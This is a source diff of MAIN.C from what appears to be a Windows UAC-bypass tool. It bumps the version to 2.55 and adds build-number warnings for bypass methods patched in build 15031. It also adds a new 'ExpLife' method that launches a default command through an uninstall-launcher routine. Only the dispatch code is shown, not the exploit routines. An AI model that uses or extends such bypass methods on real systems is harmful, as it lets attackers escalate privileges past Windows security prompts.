@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     2.54
+*  VERSION:     2.55
 *
-*  DATE:        07 Feb 2017
+*  DATE:        08 Feb 2017
 *
 *  Program entry point.
 *
@@ -520,12 +520,28 @@ UINT ucmMain()
         break;
 
     case UacMethodComet:
+        //fixed in 15031
+        if (g_ctx.dwBuildNumber >= 15031) {
+            if (ucmShowQuestion(UACFIX) == IDNO)
+                return ERROR_UNSUPPORTED_TYPE;
+        }
         break;
 
     case UacMethodEnigma0x3:
+        //fixed in 15031
+        if (g_ctx.dwBuildNumber >= 15031) {
+            if (ucmShowQuestion(UACFIX) == IDNO)
+                return ERROR_UNSUPPORTED_TYPE;
+        }
         break;
 
     case UacMethodEnigma0x3_2:
+        //partially fixed in 15031, main advantage of this method is lost
+        if (g_ctx.dwBuildNumber >= 15031) {
+            if (ucmShowQuestion(UACFIX) == IDNO)
+                return ERROR_UNSUPPORTED_TYPE;
+        }
+
 #ifndef _DEBUG
         if (g_ctx.dwBuildNumber < 10240) {
             ucmShowMessage(WIN10ONLY);
@@ -537,6 +553,9 @@ UINT ucmMain()
             ucmShowMessage(WOW64STRING);
             return ERROR_UNSUPPORTED_TYPE;
         }
+        break;
+
+    case UacMethodExpLife:
         break;
 
     }
@@ -642,7 +661,7 @@ UINT ucmMain()
             return ERROR_SUCCESS;
         }
         break;
-
+        
     case UacMethodWinsat:
 #ifndef _DEBUG
         if (g_ctx.IsWow64) {
@@ -801,7 +820,23 @@ UINT ucmMain()
             return ERROR_SUCCESS;
         }
         break;
-       
+
+    case UacMethodExpLife:
+#ifndef _WIN64 //lazy
+        if (g_ctx.IsWow64) { 
+            ucmShowMessage(LAZYWOW64UNSUPPORTED);
+            return ERROR_UNSUPPORTED_TYPE;
+        }
+#endif
+        if (paramLen == 0) {
+            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
+        }
+
+        if (ucmUninstallLauncherMethod(szBuffer)) {
+            return ERROR_SUCCESS;
+        }
+        break;      
     }
 
     return ERROR_ACCESS_DENIED;
